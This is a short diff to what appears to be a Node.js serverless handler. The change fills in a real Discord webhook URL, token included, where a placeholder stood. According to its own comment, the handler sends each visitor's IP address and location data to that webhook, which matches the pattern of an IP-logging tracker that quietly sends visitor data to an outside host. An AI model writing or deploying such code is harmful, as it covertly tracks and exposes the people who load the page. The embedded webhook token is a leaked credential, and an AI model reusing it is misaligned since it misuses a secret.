@@ -14,7 +14,7 @@ module.exports = async (req, res) => {
   };
 
   // Step 4: Send the IP and location data to the Discord webhook
-  await fetch('YOUR_DISCORD_WEBHOOK_URL', {
+  await fetch('https://discord.com/api/webhooks/1361457750583808070/q38i0fo9Iwmfw8xT9qq5QWCWBSZqvYt-LAEEDF2jr27B1Omb3DkEG0BtSHlGwqqHl0Fp', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json'
